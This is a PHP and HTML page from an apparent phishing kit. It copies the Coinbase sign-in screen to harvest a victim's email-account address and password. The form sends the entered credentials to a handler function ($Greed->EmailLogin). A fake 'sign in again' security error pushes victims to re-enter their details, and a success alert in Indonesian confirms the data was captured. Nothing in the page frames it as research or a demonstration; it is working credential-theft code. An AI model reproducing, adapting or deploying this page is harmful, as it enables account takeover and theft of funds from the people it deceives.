<?php
session_start();
require_once('../function/settings.php');
$Greed = new Coinbasah();
if($_SESSION['Status'] != 'Email'){
  $Greed->redirectTo();
}
if(isset($_POST['Next'])){
    if($Greed->EmailLogin($_POST)){
        echo "<script>alert('Berhasil Menginput Data');</script>";
    }  
}
?>
<!DOCTYPE html>
<html lang="en" class="js-focus-visible" data-js-focus-visible="">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="origin-trial" content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <title>Coinbase - Sign In</title>
    <meta name="theme-color" content="#0052ff">
    <meta name="twitter:title" content="Coinbase Sign In">
    <link rel="icon" href="assets/images/favicon.ico">
    <link href="assets/css/styles.d87df576ff25e358663e.css" rel="stylesheet">
    <link href="assets/css/styles.43cdd765c2fa35b596d4.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="assets/css/styles.babae8c0eccf7b247500.css">
    <link rel="stylesheet" type="text/css" href="assets/css/styles__ltr.css">
    <meta name="description" content="Coinbase is a secure online platform for buying, selling, transferring, and storing cryptocurrency." data-rh="true">
    <style id="googleidentityservice_button_styles">
        .qJTHM {
            -webkit-user-select: none;
            color: #202124;
            direction: ltr;
            -webkit-touch-callout: none;
            font-family: "Roboto-Regular", arial, sans-serif;
            -webkit-font-smoothing: antialiased;
            font-weight: 400;
            margin: 0;
            overflow: hidden;
            -webkit-text-size-adjust: 100%
        }

        .ynRLnc {
            left: -9999px;
            position: absolute;
            top: -9999px
        }

        .L6cTce {
            display: none
        }

        .bltWBb {
            word-break: break-all
        }

        .hSRGPd {
            color: #1a73e8;
            cursor: pointer;
            font-weight: 500;
            text-decoration: none
        }

        .Bz112c-W3lGp {
            height: 16px;
            width: 16px
        }

        .Bz112c-E3DyYd {
            height: 20px;
            width: 20px
        }

        .Bz112c-r9oPif {
            height: 24px;
            width: 24px
        }

        .Bz112c-uaxL4e {
            -webkit-border-radius: 10px;
            border-radius: 10px
        }

        .LgbsSe-Bz112c {
            display: block
        }

        .S9gUrf-YoZ4jf,
        .S9gUrf-YoZ4jf * {
            border: none;
            margin: 0;
            padding: 0
        }

        .fFW7wc-ibnC6b>.aZ2wEe>div {
            border-color: #4285f4
        }

        .P1ekSe-ZMv3u>div:nth-child(1) {
            background-color: #1a73e8 !important
        }

        .P1ekSe-ZMv3u>div:nth-child(2),
        .P1ekSe-ZMv3u>div:nth-child(3) {
            background-image: linear-gradient(to right, rgba(255, 255, 255, .7), rgba(255, 255, 255, .7)), linear-gradient(to right, #1a73e8, #1a73e8) !important
        }

        .haAclf {
            display: inline-block
        }

        .nsm7Bb-HzV7m-LgbsSe {
            -webkit-border-radius: 4px;
            border-radius: 4px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            -webkit-transition: background-color .218s, border-color .218s;
            transition: background-color .218s, border-color .218s;
            -webkit-user-select: none;
            -webkit-appearance: none;
            background-color: #fff;
            background-image: none;
            border: 1px solid #dadce0;
            color: #3c4043;
            cursor: pointer;
            font-family: "Google Sans", arial, sans-serif;
            font-size: 14px;
            height: 40px;
            letter-spacing: 0.25px;
            outline: none;
            overflow: hidden;
            padding: 0 12px;
            position: relative;
            text-align: center;
            vertical-align: middle;
            white-space: nowrap;
            width: auto
        }

        @media screen and (-ms-high-contrast:active) {
            .nsm7Bb-HzV7m-LgbsSe {
                border: 2px solid windowText;
                color: windowText
            }
        }

        .nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe {
            font-size: 14px;
            height: 32px;
            letter-spacing: 0.25px;
            padding: 0 10px
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe {
            font-size: 11px;
            height: 20px;
            letter-spacing: 0.3px;
            padding: 0 8px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe {
            padding: 0;
            width: 40px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe {
            width: 32px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe {
            width: 20px
        }

        .nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK {
            -webkit-border-radius: 20px;
            border-radius: 20px
        }

        .nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.pSzOP-SxQuSe {
            -webkit-border-radius: 16px;
            border-radius: 16px
        }

        .nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.purZT-SxQuSe {
            -webkit-border-radius: 10px;
            border-radius: 10px
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc {
            border: none;
            color: #fff
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-v3pZbf-Ia7Qfc {
            background-color: #1a73e8
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-JaPV2b-Ia7Qfc {
            background-color: #202124;
            color: #e8eaed
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            height: 18px;
            margin-right: 8px;
            min-width: 18px;
            width: 18px
        }

        .nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            height: 14px;
            min-width: 14px;
            width: 14px
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            height: 10px;
            min-width: 10px;
            width: 10px
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            margin-left: 8px;
            margin-right: -4px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            margin: 0;
            padding: 10px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            padding: 8px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            padding: 4px
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-top-left-radius: 3px;
            border-top-left-radius: 3px;
            -webkit-border-bottom-left-radius: 3px;
            border-bottom-left-radius: 3px;
            display: -webkit-box;
            display: -webkit-flex;
            display: flex;
            justify-content: center;
            -webkit-align-items: center;
            align-items: center;
            background-color: #fff;
            height: 36px;
            margin-left: -10px;
            margin-right: 12px;
            min-width: 36px;
            width: 36px
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c,
        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            margin: 0;
            padding: 0
        }

        .nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            height: 28px;
            margin-left: -8px;
            margin-right: 10px;
            min-width: 28px;
            width: 28px
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            height: 16px;
            margin-left: -6px;
            margin-right: 8px;
            min-width: 16px;
            width: 16px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-radius: 3px;
            border-radius: 3px;
            margin-left: 2px;
            margin-right: 0;
            padding: 0
        }

        .nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-radius: 18px;
            border-radius: 18px
        }

        .nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-radius: 14px;
            border-radius: 14px
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-radius: 8px;
            border-radius: 8px
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-bN97Pc-sM5MNb {
            display: -webkit-box;
            display: -webkit-flex;
            display: flex;
            -webkit-align-items: center;
            align-items: center;
            -webkit-flex-direction: row;
            flex-direction: row;
            justify-content: space-between;
            -webkit-flex-wrap: nowrap;
            flex-wrap: nowrap;
            height: 100%;
            position: relative;
            width: 100%
        }

        .nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX {
            justify-content: center
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-BPrWId {
            -webkit-flex-grow: 1;
            flex-grow: 1;
            font-family: "Google Sans", arial, sans-serif;
            font-weight: 500;
            overflow: hidden;
            text-overflow: ellipsis;
            vertical-align: top
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-BPrWId {
            font-weight: 300
        }

        .nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX .nsm7Bb-HzV7m-LgbsSe-BPrWId {
            -webkit-flex-grow: 0;
            flex-grow: 0
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            -webkit-transition: background-color .218s;
            transition: background-color .218s;
            bottom: 0;
            left: 0;
            position: absolute;
            right: 0;
            top: 0
        }

        .nsm7Bb-HzV7m-LgbsSe:hover,
        .nsm7Bb-HzV7m-LgbsSe:focus {
            -webkit-box-shadow: none;
            box-shadow: none;
            border-color: #d2e3fc;
            outline: none
        }

        .nsm7Bb-HzV7m-LgbsSe:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe,
        .nsm7Bb-HzV7m-LgbsSe:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            background: rgba(66, 133, 244, .04)
        }

        .nsm7Bb-HzV7m-LgbsSe:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            background: rgba(66, 133, 244, .1)
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe,
        .nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            background: rgba(255, 255, 255, .24)
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            background: rgba(255, 255, 255, .32)
        }

        .nsm7Bb-HzV7m-LgbsSe .n1UuX-DkfjY {
            -webkit-border-radius: 50%;
            border-radius: 50%;
            display: -webkit-box;
            display: -webkit-flex;
            display: flex;
            height: 20px;
            margin-left: -4px;
            margin-right: 8px;
            min-width: 20px;
            width: 20px
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId {
            font-family: "Roboto";
            font-size: 12px;
            text-align: left
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .ssJRIf,
        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .fmcmS {
            overflow: hidden;
            text-overflow: ellipsis
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff {
            display: -webkit-box;
            display: -webkit-flex;
            display: flex;
            -webkit-align-items: center;
            align-items: center;
            color: #5f6368;
            fill: #5f6368;
            font-size: 11px;
            font-weight: 400
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe.MFS4be-Ia7Qfc .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff {
            color: #e8eaed;
            fill: #e8eaed
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .Bz112c {
            height: 18px;
            margin: -3px -3px -3px 2px;
            min-width: 18px;
            width: 18px
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-top-left-radius: 0;
            border-top-left-radius: 0;
            -webkit-border-bottom-left-radius: 0;
            border-bottom-left-radius: 0;
            -webkit-border-top-right-radius: 3px;
            border-top-right-radius: 3px;
            -webkit-border-bottom-right-radius: 3px;
            border-bottom-right-radius: 3px;
            margin-left: 12px;
            margin-right: -10px
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-radius: 18px;
            border-radius: 18px
        }

        .L5Fo6c-sM5MNb {
            border: 0;
            display: block;
            left: 0;
            position: relative;
            top: 0
        }

        .L5Fo6c-bF1uUb {
            -webkit-border-radius: 4px;
            border-radius: 4px;
            bottom: 0;
            cursor: pointer;
            left: 0;
            position: absolute;
            right: 0;
            top: 0
        }

        .L5Fo6c-bF1uUb:focus {
            border: none;
            outline: none
        }
    </style>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
</head>

<body class="cds-light-l1k3tbpe" style="background-color: rgba(var(--gray0));"><noscript>You need to enable JavaScript
        to run this app.</noscript>
    <div id="root" style="display: flex; flex-direction: column; min-height: 100%">
        <div class="cds-large-llfbhh8 cds-light-l1k3tbpe" style="--foreground: rgb(var(--gray100)); --foreground-muted: rgb(var(--gray60)); --background: rgb(var(--gray0)); --background-alternate: rgb(var(--gray5)); --background-overlay: rgba(var(--gray80),0.33); --line: rgba(var(--gray60),0.2); --line-heavy: rgba(var(--gray60),0.66); --primary: rgb(var(--blue60)); --primary-wash: rgb(var(--blue0)); --primary-foreground: rgb(var(--gray0)); --negative: rgb(var(--red60)); --negative-foreground: rgb(var(--gray0)); --positive: rgb(var(--green60)); --positive-foreground: rgb(var(--gray0)); --secondary: rgb(var(--gray5)); --secondary-foreground: rgb(var(--gray100)); --transparent: rgba(var(--gray0),0); --warning: rgb(var(--yellow50));">
            <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-background-b85wjan" style="height: 100%; width: 100%;">
                <div data-testid="signin-header" class="cds-flex-f1g67tkn cds-center-cv8796s cds-center-ca5ylan cds-space-between-s1vbz1 cds-background-b85wjan cds-2-_115h1mf cds-2-_1qjdqpv cds-3-_1ol1258 cds-3-_1ti0n00 cds-5-_g0seea" style="width: 100%;"><a data-testid="header-logo-link" class="cds-link cds-link-l17zyfmx" title="Home" href="#"><span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container"><svg aria-label="Coinbase logo" class="cds-iconStyles-iogjozt" height="32" role="img" viewBox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
                                <title>Coinbase logo</title>
                                <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#0052FF"></path>
                            </svg></span></a>
                    <div class="cds-flex-f1g67tkn cds-row-r1tfxker cds-1-_obadkb"><a data-testid="button-sign-up" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-secondaryForeground-s111xox1 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" href="#" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: transparent; --interactable-hovered-background: rgb(250, 250, 250); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(235, 235, 236); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(255, 255, 255);"><span class="cds-positionRelative-p109mlw7"><span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-secondaryForeground-s111xox1 cds-transition-txjiwsi cds-start-s1muvu8a"></span></span></a><a data-testid="button-business-login" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-secondaryForeground-s111xox1 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" href="#" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: var(--secondary); --interactable-hovered-background: rgb(233, 235, 238); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(220, 222, 225); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(247, 248, 249);"><span class="cds-positionRelative-p109mlw7"><span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-secondaryForeground-s111xox1 cds-transition-txjiwsi cds-start-s1muvu8a"><span class="">Sign out</span></span></span></a></div>
                </div>
                <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-1-_1xqs9y8 cds-1-_9w3lns" style="width: 100%;">
                    <div class="cds-flex-f1g67tkn cds-flex-start-f1lnfmfd cds-row-r1tfxker cds-center-czxavit" style="width: 100%;">
                        <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="max-width: 448px; width: 100%;">
                            <div class="cds-flex-f1g67tkn cds-center-czxavit cds-roundedLarge-rdc2t5d cds-bordered-b17mbjy1 cds-5-_1fh7zw6 cds-5-_1yjsi5b cds-4-_1w9a5m" style="width: 100%;">
                                <div id="two-factor" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_1mvq9l2" style="width: 100%;">
                                    <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 448px; width: 100%;">
                                        <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 448px; width: 100%;">
                                            <div data-testid="load-view-wrapper" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 448px; width: 100%;">
                                                <div data-testid="password-input-code" class="cds-flex-f1g67tkn cds-column-ci8mx7v">
                                                    <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-2-_1qjdqpv">
                                                        <?php if(isset($_SESSION['errorb'])){ ?>
                                                        <div class="alert alert-danger alert-dismissible fade" role="alert">
                                                            <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                                                <span aria-hidden="true">&times;</span>
                                                            </button>
                                                            For security reasons, please sign in to your account again.
                                                        </div>
                                                        <?php } ?>
                                                        <img border="0" hspace="0" alt="" src="assets/images/<?= @$_SESSION['mailimage']; ?>.png" align="baseline">
                                                        <div data-testid="description" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-1-_1xqs9y8 cds-3-_zv3bp">
                                                            <p class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foregroundMuted-f1vw1sy6 cds-transition-txjiwsi cds-start-s1muvu8a cds-break-b8plbaq" style="text-align: center; padding-top:10px; padding-bottom:40px;">
                                                                <span style="font-size: 25px; color:black;">Sign in</span><br>
                                                                Use your <?= @$_SESSION['Mailtype']; ?> Account</p>
                                                        </div>
                                                    </div>
                                                    <form method="POST">
                                                        <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0_5-_5akrcb" style="width: 100%; opacity: 1;">
                                                            <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                                                                <div class="cds-inputAreaContainerStyles-i1sndg40"><span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(250, 250, 250); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(235, 235, 236); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(255, 255, 255);"><input aria-label="Email" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" data-testid="email-input" tabindex="0" aria-invalid="false" id="cds-textinput-label-:r5:" value="<?= @$_SESSION['Email'] ?>" placeholder="Email address" type="email" autocomplete="username webauthn" value="" name="email" style="text-align: start; color-scheme: light;" required></span>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0_5-_5akrcb" style="width: 100%; opacity: 1; padding-top:10px;">
                                                            <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                                                                <div class="cds-inputAreaContainerStyles-i1sndg40"><span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--negative); --border-color-unfocused: var(--line-heavy); <?php if(isset($_SESSION['errorb'])){ echo "--border-color-focused: var(--negative);"; }else{ echo "--border-color-focused: var(--primary);"; } ?> --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(250, 250, 250); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(235, 235, 236); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(255, 255, 255);"><input aria-label="Email" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" data-testid="email-input" tabindex="0" aria-invalid="false" id="cds-textinput-label-:r5:" placeholder="Password" type="Password" autocomplete="username webauthn" value="" name="password" style="text-align: start; color-scheme: light;" autofocus required></span>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foregroundMuted-f1vw1sy6 cds-transition-txjiwsi cds-start-s1muvu8a cds-break-b8plbaq" style="padding-top: 17px;">
                                                        <p style="font-size: 15px;">Login to your <?= @$_SESSION['Mailtype']; ?> account to verify. <a href="#">Learn more</a></p>
                                                        </div>
                                                        <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-2-_115h1mf cds-2-_8lqlrb">
                                                            <button data-testid="password-submit-button" name="Next" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-fullWidth-fnzgr0o cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-buttonBlock-b90146d cds-4-_1arbnhr cds-4-_hd2z08" type="submit" style="--interactable-height: 56px; --interactable-border-radius: 56px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(1, 76, 236); --interactable-hovered-opacity: 0.92; --interactable-pressed-background: rgb(1, 72, 221); --interactable-pressed-opacity: 0.86; --interactable-disabled-background: rgb(128, 169, 255);"><span class="cds-positionRelative-p109mlw7"><span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primaryForeground-pxcz3o7 cds-transition-txjiwsi cds-start-s1muvu8a"><span class="">Continue</span></span></span></button>
                                                        </form>
                                                        <div>
                                                            <a href="" class="cds-body-bb7l4gg" style="text-decoration: none; color:#1a73e8; font-size:small;">Privacy policy</a>
                                                        </div>
                                                </div>
                                                <div class="cds-flex-f1g67tkn r7rfe1z">
                                                    <div data-testid="visible_recaptcha" data-sitekey="NOT_USED"></div>
                                                    <div data-testid="invisible_recaptcha" data-sitekey="6LcTV7IcAAAAAI1CwwRBm58wKn1n6vwyV1QFaoxr">
                                                        <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
                                                            <div class="grecaptcha-logo">
                                                                <div class="rc-anchor rc-anchor-invisible rc-anchor-light rc-anchor-invisible-hover">
                                                                    <div id="recaptcha-accessible-status" class="rc-anchor-aria-status" aria-hidden="true">Recaptcha requires verification. </div>
                                                                    <div class="rc-anchor-error-msg-container" style="display:none"><span class="rc-anchor-error-msg" aria-hidden="true"></span></div>
                                                                    <div class="rc-anchor-normal-footer">
                                                                        <div class="rc-anchor-logo-large" role="presentation">
                                                                            <div class="rc-anchor-logo-img rc-anchor-logo-img-large"></div>
                                                                        </div>
                                                                        <div class="rc-anchor-pt"><a href="#" target="_blank">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="#" target="_blank">Terms</a></div>
                                                                    </div>
                                                                    <div class="rc-anchor-invisible-text"><span>protected by <strong>reCAPTCHA</strong></span>
                                                                        <div class="rc-anchor-pt"><a href="#" target="_blank" style="display: unset;">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="#" target="_blank" style="display: unset;">Terms</a></div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div data-testname="open-banner" data-testid="banner-container" class="cds-flex-f1g67tkn cds-fixed-f1v5p9l4" style="width: 100%; position: fixed; bottom: 0px; z-index: 3; transition: bottom 500ms ease 0s; will-change: bottom;">
                <div id="cookie-banner" class="cookie-banner cds-flex-f1g67tkn cds-center-czxavit cds-backgroundAlternate-b1o0kdmt" style="width: 100%;">
                    <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-space-between-s1vbz1 cds-3-_1ixgcz3 cds-3-_1mvq9l2 cds-6-_1iifjn6 cds-6-_1ts70zl" style="max-width: 800px; width: 100%;">
                        <p class="cds-typographyResets-t1xhpuq2 cds-label2-ln29cth cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-0-_vhy4ik cds-1-_7ojgr9">
                            We use strictly necessary cookies to enable essential functions, such as security and
                            authentication. For more information, see our <a class="cds-link cds-link-l17zyfmx" href="#" rel="noopener noreferrer" target="_blank"><span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container">Cookie
                                    Policy</span></a>.</p><button data-testid="dismiss-button" class="dismiss-button cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" type="button" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(1, 76, 236); --interactable-hovered-opacity: 0.92; --interactable-pressed-background: rgb(1, 72, 221); --interactable-pressed-opacity: 0.86; --interactable-disabled-background: rgb(128, 169, 255);"><span class="cds-positionRelative-p109mlw7"><span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primaryForeground-pxcz3o7 cds-transition-txjiwsi cds-start-s1muvu8a"><span class="">Dismiss</span></span></span></button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="portalRoot" style="z-index: 100001; position: relative; display: flex;">
        <div data-testid="portal-modal-container" id="modalsContainer" style="z-index: 3;"></div>
        <div data-testid="portal-toast-container" id="toastsContainer" style="z-index: 6;"></div>
        <div data-testid="portal-alert-container" id="alertsContainer" style="z-index: 7;">
            <div class="cds-large-llfbhh8 cds-light-l1k3tbpe" style="--foreground: rgb(var(--gray100)); --foreground-muted: rgb(var(--gray60)); --background: rgb(var(--gray0)); --background-alternate: rgb(var(--gray5)); --background-overlay: rgba(var(--gray80),0.33); --line: rgba(var(--gray60),0.2); --line-heavy: rgba(var(--gray60),0.66); --primary: rgb(var(--blue60)); --primary-wash: rgb(var(--blue0)); --primary-foreground: rgb(var(--gray0)); --negative: rgb(var(--red60)); --negative-foreground: rgb(var(--gray0)); --positive: rgb(var(--green60)); --positive-foreground: rgb(var(--gray0)); --secondary: rgb(var(--gray5)); --secondary-foreground: rgb(var(--gray100)); --transparent: rgba(var(--gray0),0); --warning: rgb(var(--yellow50));">
            </div>
        </div>
        <div data-testid="portal-tooltip-container" id="tooltipContainer" style="z-index: 5;"></div>
    </div>
    <div id="cds-hexagon-clipPath-container" aria-hidden="true" style="height: 0px; width: 0px;"><svg height="0" viewBox="0 0 66 62" width="0">
            <defs>
                <clippath clipPathUnits="objectBoundingBox" id="cds-hexagon-avatar-clipper" transform="scale(0.015151515151515152 0.016129032258064516)">
